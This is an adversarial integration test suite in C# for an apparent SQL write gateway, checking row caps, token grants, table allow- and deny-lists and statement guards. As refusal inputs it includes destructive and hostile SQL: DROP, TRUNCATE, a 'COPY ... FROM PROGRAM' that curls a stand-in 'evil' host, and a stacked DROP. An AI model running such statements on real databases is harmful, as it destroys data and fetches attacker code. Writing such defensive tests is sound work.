using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Npgsql;
using Rtfq.Client;
using Rtfq.Contracts;
using Rtfq.Server;
using Rtfq.Server.Configuration;
using Testcontainers.PostgreSql;

namespace Rtfq.Adapters.Tests;

/// <summary>
/// The write path end to end, against a real PostgreSQL.
///
/// M3 ships on this suite rather than on the feature working, so these tests are
/// written adversarially: each one is a way the gates could be got past, not a
/// demonstration that the happy path works. Where a test asserts a refusal it
/// also asserts the data is unchanged, because a gate that reports "no" while
/// letting the write through is the failure that matters.
/// </summary>
public sealed class WritePathFixture : IAsyncLifetime
{
    public const string WriterToken = "writer-token-0123456789";
    public const string ReaderToken = "reader-token-0123456789";
    public const string SchemaToken = "schema-token-0123456789";
    public const int Cap = 5;
    public const int SeededRows = 40;

    PostgreSqlContainer _postgres = null!;
    RtfqServer _server = null!;
    string _workDir = null!;

    public string BaseAddress { get; private set; } = "";
    public string StateDir { get; private set; } = "";

    public async Task InitializeAsync()
    {
        _workDir = Path.Combine(Path.GetTempPath(), "rtfq-write", Guid.NewGuid().ToString("n")[..8]);
        StateDir = Path.Combine(_workDir, "state");
        Directory.CreateDirectory(StateDir);

        _postgres = new PostgreSqlBuilder("postgres:17-alpine").WithDatabase("shop").Build();
        await _postgres.StartAsync();

        await using (var conn = new NpgsqlConnection(_postgres.GetConnectionString()))
        {
            await conn.OpenAsync();
            await using var cmd = new NpgsqlCommand($"""
                CREATE TABLE orders (
                    id int primary key, status text not null, total numeric(10,2) not null, note text);
                INSERT INTO orders SELECT g, CASE WHEN g % 4 = 0 THEN 'stuck' ELSE 'paid' END, g * 1.5, NULL
                FROM generate_series(1, {SeededRows}) g;

                CREATE TABLE audit_trail (id serial primary key, what text);
                CREATE TABLE payment_tokens (id int primary key, token text not null);
                INSERT INTO payment_tokens VALUES (1, 'super-secret');
                """, conn);
            await cmd.ExecuteNonQueryAsync();
        }

        var (cert, key) = Certificate(_workDir);

        var config = new RtfqConfig
        {
            Server = new ServerSection
            {
                Listen = "127.0.0.1:0",
                Tls = new TlsSection { CertPath = cert, KeyPath = key },
                Auth = new AuthSection
                {
                    Mode = "token",
                    Tokens =
                    [
                        Token("writer", WriterToken, AccessLevel.Write),
                        Token("reader", ReaderToken, AccessLevel.Read),
                        Token("schema", SchemaToken, AccessLevel.Schema),
                    ],
                },
            },
            Defaults = new DefaultsSection
            {
                MaxAffectedRows = Cap,
                StatementTimeout = TimeSpan.FromSeconds(10),
                LockTimeout = TimeSpan.FromSeconds(3),
                WriteHandleTtl = TimeSpan.FromSeconds(3),
            },
            Sources =
            [
                new SourceSection
                {
                    Name = "shop",
                    Kind = "postgres",
                    Dsn = _postgres.GetConnectionString(),
                    DsnWasReference = true,
                    // The source declares schema; each token's grant narrows it.
                    Access = AccessLevel.Schema,
                    Schemas = ["public"],
                    WritableTables = ["public.orders"],
                    DenyTables = ["*.payment_tokens"],
                },

                // Same database, allow-listed by pattern instead of by name
                // (ADR 0008). Separate source so the exact-match tests above
                // keep testing exact matching.
                new SourceSection
                {
                    Name = "shop-wild",
                    Kind = "postgres",
                    Dsn = _postgres.GetConnectionString(),
                    DsnWasReference = true,
                    Access = AccessLevel.Write,
                    Schemas = ["public"],
                    WritableTables = ["public.*"],
                    DenyTables = ["*.payment_tokens"],
                },
            ],
        };

        _server = await RtfqServer.StartAsync(config, StateDir);
        BaseAddress = _server.BaseAddress;
    }

    static TokenSection Token(string id, string secret, AccessLevel grant) => new()
    {
        Id = id,
        Secret = secret,
        SecretWasReference = true,
        Grants = new Dictionary<string, AccessLevel> { ["shop"] = grant, ["shop-wild"] = grant },
    };

    static (string Cert, string Key) Certificate(string directory)
    {
        Directory.CreateDirectory(directory);
        var certPath = Path.Combine(directory, "tls.crt");
        var keyPath = Path.Combine(directory, "tls.key");

        using var rsa = RSA.Create(2048);
        var request = new CertificateRequest("CN=localhost", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        var san = new SubjectAlternativeNameBuilder();
        san.AddDnsName("localhost");
        san.AddIpAddress(System.Net.IPAddress.Loopback);
        request.CertificateExtensions.Add(san.Build());

        using var certificate = request.CreateSelfSigned(DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(1));
        File.WriteAllText(certPath, certificate.ExportCertificatePem());
        File.WriteAllText(keyPath, rsa.ExportPkcs8PrivateKeyPem());
        return (certPath, keyPath);
    }

    public RtfqClient Client(string token) => new(BaseAddress, token, skipCertificateValidation: true);

    /// <summary>Reads the database directly, so an assertion about the data does not go through the thing under test.</summary>
    public async Task<T> ScalarAsync<T>(string sql)
    {
        await using var conn = new NpgsqlConnection(_postgres.GetConnectionString());
        await conn.OpenAsync();
        await using var cmd = new NpgsqlCommand(sql, conn);
        var value = await cmd.ExecuteScalarAsync();
        return (T)Convert.ChangeType(value!, typeof(T), System.Globalization.CultureInfo.InvariantCulture);
    }

    /// <summary>
    /// The server holds the journal open for append, so this must share the file
    /// rather than take it exclusively.
    /// </summary>
    public string AuditText()
    {
        var path = Path.Combine(StateDir, "audit.jsonl");
        if (!File.Exists(path)) return "";

        using var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        using var reader = new StreamReader(stream);
        return reader.ReadToEnd();
    }

    public async Task DisposeAsync()
    {
        await _server.DisposeAsync();
        await _postgres.DisposeAsync();
        try { Directory.Delete(_workDir, recursive: true); } catch (IOException) { }
    }
}

[CollectionDefinition(nameof(WriteCollection))]
public sealed class WriteCollection : ICollectionFixture<WritePathFixture>;

[Collection(nameof(WriteCollection))]
public sealed class WritePathTests(WritePathFixture fixture)
{
    static async Task<RtfqClientException> Refused(Func<Task> action) =>
        await Assert.ThrowsAsync<RtfqClientException>(action);

    // --- what discovery says about writing ------------------------------------

    [Fact]
    public async Task Describe_table_reports_a_table_this_token_can_actually_write()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var result = await client.DescribeTableAsync("shop", "public.orders");

        // Answered before the attempt, so an agent does not draft a statement it
        // cannot run - and, just as importantly, does not decline to draft one it can.
        Assert.True(result.Writable);
    }

    [Fact]
    public async Task Describe_table_does_not_promise_a_write_the_allow_list_would_refuse()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var result = await client.DescribeTableAsync("shop", "public.audit_trail");

        Assert.False(result.Writable);
    }

    [Fact]
    public async Task Describe_table_does_not_promise_a_write_to_a_token_granted_only_read()
    {
        using var client = fixture.Client(WritePathFixture.ReaderToken);

        var result = await client.DescribeTableAsync("shop", "public.orders");

        // Same table, same allow-list; the grant is what differs. Writable is per
        // caller, not per table.
        Assert.False(result.Writable);
    }

    // --- the allow-list as a pattern (ADR 0008) --------------------------------

    [Fact]
    public async Task A_pattern_allow_list_reaches_a_table_nobody_named()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        // public.audit_trail is not on shop's allow-list and is not written down
        // anywhere on shop-wild's either. The pattern is what permits it.
        var proposal = await client.ProposeWriteAsync("shop-wild",
            "INSERT INTO audit_trail (what) VALUES ('via pattern')");

        await client.CommitWriteAsync(proposal.Handle);

        Assert.Equal(1, await fixture.ScalarAsync<int>(
            "SELECT count(*) FROM audit_trail WHERE what = 'via pattern'"));
    }

    [Fact]
    public async Task A_deny_rule_still_beats_the_pattern()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        // This is the property that makes a wildcard defensible at all: there is
        // still a way to carve something out, and it is evaluated first.
        var error = await Refused(() => client.ProposeWriteAsync("shop-wild",
            "UPDATE payment_tokens SET token = 'stolen' WHERE id = 1"));

        Assert.Equal(ErrorCodes.InsufficientAccess, error.Code);
        Assert.Equal("super-secret", await fixture.ScalarAsync<string>(
            "SELECT token FROM payment_tokens WHERE id = 1"));
    }

    [Fact]
    public async Task The_pattern_does_not_leak_into_the_source_next_to_it()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        // shop lists public.orders exactly. Sharing a database with a
        // pattern-allowed source must not widen it.
        var error = await Refused(() => client.ProposeWriteAsync("shop",
            "INSERT INTO audit_trail (what) VALUES ('should not reach')"));

        Assert.Equal(ErrorCodes.InsufficientAccess, error.Code);
        Assert.Contains("not on the write allow-list", error.Message);
    }

    // --- the propose/commit split ---------------------------------------------

    [Fact]
    public async Task A_proposal_changes_nothing_until_it_is_committed()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var proposal = await client.ProposeWriteAsync("shop",
            "UPDATE orders SET note = 'looked at' WHERE id = 1");

        Assert.Equal(1, proposal.AffectedRows);
        Assert.Equal("public.orders", proposal.Target);
        Assert.False(proposal.RequiresApproval);

        // Read from outside the transaction: still unchanged.
        Assert.Equal(0, await fixture.ScalarAsync<int>(
            "SELECT count(*) FROM orders WHERE note = 'looked at'"));

        await client.CommitWriteAsync(proposal.Handle);

        Assert.Equal(1, await fixture.ScalarAsync<int>(
            "SELECT count(*) FROM orders WHERE note = 'looked at'"));
    }

    [Fact]
    public async Task A_proposal_carries_the_rows_as_they_were_before()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var proposal = await client.ProposeWriteAsync("shop",
            "UPDATE orders SET status = 'refunded' WHERE id = 2");

        Assert.NotEmpty(proposal.DiffColumns);
        var row = proposal.DiffSample[0]!.AsArray();
        var status = proposal.DiffColumns.FindIndex(c => c.Name == "status");
        Assert.Equal("paid", row[status]!.GetValue<string>());

        await client.AbortWriteAsync(proposal.Handle);
    }

    [Fact]
    public async Task Aborting_rolls_back()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);
        var before = await fixture.ScalarAsync<long>("SELECT count(*) FROM orders");

        var proposal = await client.ProposeWriteAsync("shop", "DELETE FROM orders WHERE id = 3");
        Assert.Equal(1, proposal.AffectedRows);

        await client.AbortWriteAsync(proposal.Handle);

        Assert.Equal(before, await fixture.ScalarAsync<long>("SELECT count(*) FROM orders"));
    }

    [Fact]
    public async Task A_handle_is_single_use()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var proposal = await client.ProposeWriteAsync("shop", "UPDATE orders SET note = 'once' WHERE id = 4");
        await client.CommitWriteAsync(proposal.Handle);

        var ex = await Refused(() => client.CommitWriteAsync(proposal.Handle));
        Assert.Equal(ErrorCodes.SourceUnknown, ex.Code);
    }

    [Fact]
    public async Task A_handle_belongs_to_the_caller_that_made_it()
    {
        using var writer = fixture.Client(WritePathFixture.WriterToken);
        using var other = fixture.Client(WritePathFixture.SchemaToken);

        var proposal = await writer.ProposeWriteAsync("shop", "UPDATE orders SET note = 'mine' WHERE id = 5");

        // Another token must not be able to settle it, and must not learn it exists.
        var ex = await Refused(() => other.CommitWriteAsync(proposal.Handle));
        Assert.Equal(ErrorCodes.SourceUnknown, ex.Code);

        await writer.AbortWriteAsync(proposal.Handle);
    }

    [Fact]
    public async Task An_expired_handle_rolls_back_by_itself()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var proposal = await client.ProposeWriteAsync("shop", "UPDATE orders SET note = 'expiring' WHERE id = 6");
        Assert.Equal(1, proposal.AffectedRows);

        // TTL is 3s in this fixture and the sweeper runs every 5s.
        await Task.Delay(TimeSpan.FromSeconds(11));

        var ex = await Refused(() => client.CommitWriteAsync(proposal.Handle));
        Assert.Equal(ErrorCodes.SourceUnknown, ex.Code);

        Assert.Equal(0, await fixture.ScalarAsync<int>("SELECT count(*) FROM orders WHERE note = 'expiring'"));
        Assert.Contains("\"outcome\":\"expired\"", fixture.AuditText(), StringComparison.Ordinal);
    }

    // --- the affected-row cap ---------------------------------------------------

    /// <summary>
    /// The exit criterion: one row over the cap is refused with the REAL count,
    /// and the transaction is provably rolled back.
    /// </summary>
    [Fact]
    public async Task One_row_over_the_cap_is_refused_with_the_real_count_and_rolled_back()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);
        var overCap = WritePathFixture.Cap + 1;

        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            $"UPDATE orders SET note = 'over' WHERE id <= {overCap}"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Contains($"{overCap} rows", ex.Message, StringComparison.Ordinal);
        Assert.Contains($"cap for 'shop' is {WritePathFixture.Cap}", ex.Message, StringComparison.Ordinal);

        // Re-read the rows: the refusal actually rolled back.
        Assert.Equal(0, await fixture.ScalarAsync<int>("SELECT count(*) FROM orders WHERE note = 'over'"));
    }

    [Fact]
    public async Task Exactly_the_cap_is_allowed()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var proposal = await client.ProposeWriteAsync("shop",
            $"UPDATE orders SET note = 'at-cap' WHERE id BETWEEN 10 AND {10 + WritePathFixture.Cap - 1}");

        Assert.Equal(WritePathFixture.Cap, proposal.AffectedRows);
        await client.AbortWriteAsync(proposal.Handle);
    }

    // --- gate one and two: source access and token grant ---------------------------

    [Fact]
    public async Task A_read_only_token_cannot_propose_a_write()
    {
        using var client = fixture.Client(WritePathFixture.ReaderToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            "UPDATE orders SET note = 'reader' WHERE id = 7"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Equal(0, await fixture.ScalarAsync<int>("SELECT count(*) FROM orders WHERE note = 'reader'"));
    }

    [Fact]
    public async Task A_write_token_cannot_make_a_schema_change()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        // The source allows schema; this token was granted only write. The
        // effective level is the intersection.
        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            "ALTER TABLE orders ADD COLUMN extra text"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
    }

    // --- gate three: the target allow-list ---------------------------------------------

    [Fact]
    public async Task A_table_that_is_not_on_the_allow_list_is_refused()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            "INSERT INTO audit_trail (what) VALUES ('sneaky')"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Contains("not on the write allow-list", ex.Message, StringComparison.Ordinal);
        Assert.Equal(0, await fixture.ScalarAsync<long>("SELECT count(*) FROM audit_trail"));
    }

    [Fact]
    public async Task A_denied_table_is_refused_even_though_nothing_allows_it_anyway()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            "UPDATE payment_tokens SET token = 'x' WHERE id = 1"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Contains("denied", ex.Message, StringComparison.Ordinal);
    }

    /// <summary>
    /// Deny applies to everything a statement touches, not only its target. A
    /// write to an allowed table that READS a denied one is still reading it.
    /// </summary>
    [Fact]
    public async Task A_denied_table_reached_through_a_subquery_is_still_denied()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            "UPDATE orders SET note = (SELECT token FROM payment_tokens WHERE id = 1) WHERE id = 8"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Contains("payment_tokens", ex.Message, StringComparison.Ordinal);
    }

    // --- gate four: the statement guard ---------------------------------------------------

    [Fact]
    public async Task An_unqualified_update_is_refused()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop", "UPDATE orders SET note = 'all'"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Contains("no WHERE clause", ex.Message, StringComparison.Ordinal);
        Assert.Equal(0, await fixture.ScalarAsync<int>("SELECT count(*) FROM orders WHERE note = 'all'"));
    }

    [Theory]
    [InlineData("UPDATE orders SET note = 'x' WHERE 1=1")]
    [InlineData("UPDATE orders SET note = 'x' WHERE true")]
    [InlineData("DELETE FROM orders WHERE id = 1 OR true")]
    public async Task A_trivially_true_predicate_is_unqualified_however_it_is_spelled(string statement)
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop", statement));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Contains("trivially true", ex.Message, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("DROP TABLE orders")]
    [InlineData("TRUNCATE orders")]
    [InlineData("COPY orders FROM PROGRAM 'curl http://evil'")]
    [InlineData("DO $$ BEGIN DELETE FROM orders; END $$")]
    [InlineData("GRANT ALL ON orders TO PUBLIC")]
    public async Task Catastrophic_statements_are_refused_whatever_the_grant(string statement)
    {
        using var client = fixture.Client(WritePathFixture.SchemaToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop", statement));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Equal(WritePathFixture.SeededRows, await fixture.ScalarAsync<long>("SELECT count(*) FROM orders"));
    }

    [Fact]
    public async Task A_write_hidden_in_a_cte_cannot_be_gated_and_is_refused()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            "WITH gone AS (DELETE FROM orders WHERE id = 9 RETURNING *) SELECT * FROM gone"));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        Assert.Equal(1, await fixture.ScalarAsync<int>("SELECT count(*) FROM orders WHERE id = 9"));
    }

    [Fact]
    public async Task Two_statements_are_refused()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop",
            "UPDATE orders SET note = 'a' WHERE id = 11; DROP TABLE orders"));

        Assert.Equal(ErrorCodes.SourceRejected, ex.Code);
    }

    [Fact]
    public async Task A_read_sent_to_propose_write_is_refused_as_a_mistake_not_a_breach()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop", "SELECT * FROM orders"));

        Assert.Equal(ErrorCodes.RequestMalformed, ex.Code);
    }

    // --- schema changes (ADR 0002) -----------------------------------------------------------

    [Fact]
    public async Task An_additive_schema_change_is_allowed_with_a_schema_grant()
    {
        using var client = fixture.Client(WritePathFixture.SchemaToken);

        var proposal = await client.ProposeWriteAsync("shop", "ALTER TABLE orders ADD COLUMN tier int");
        Assert.Equal("schema", proposal.Kind);
        Assert.Null(proposal.AffectedRows);   // the row cap does not apply to DDL

        await client.CommitWriteAsync(proposal.Handle);

        Assert.Equal(1, await fixture.ScalarAsync<int>(
            "SELECT count(*) FROM information_schema.columns WHERE table_name='orders' AND column_name='tier'"));
    }

    [Theory]
    [InlineData("ALTER TABLE orders DROP COLUMN note")]
    [InlineData("ALTER TABLE orders RENAME TO orders_old")]
    [InlineData("ALTER TABLE orders SET SCHEMA public")]
    [InlineData("CREATE TABLE brand_new (id int)")]
    public async Task Destructive_or_repointing_schema_changes_are_refused(string statement)
    {
        using var client = fixture.Client(WritePathFixture.SchemaToken);

        var ex = await Refused(() => client.ProposeWriteAsync("shop", statement));

        Assert.Equal(ErrorCodes.InsufficientAccess, ex.Code);
        // The column the first case tried to drop is still there.
        Assert.Equal(1, await fixture.ScalarAsync<int>(
            "SELECT count(*) FROM information_schema.columns WHERE table_name='orders' AND column_name='note'"));
    }

    // --- the journal ------------------------------------------------------------------------

    [Fact]
    public async Task Every_mutation_is_journalled_with_its_before_images()
    {
        using var client = fixture.Client(WritePathFixture.WriterToken);

        var proposal = await client.ProposeWriteAsync("shop",
            "UPDATE orders SET status = 'journalled' WHERE id = 12");
        await client.CommitWriteAsync(proposal.Handle);

        var audit = fixture.AuditText();
        Assert.Contains("\"operation\":\"propose_write\"", audit, StringComparison.Ordinal);
        Assert.Contains("\"before_images\"", audit, StringComparison.Ordinal);
        Assert.Contains("\"outcome\":\"committed\"", audit, StringComparison.Ordinal);
    }
}
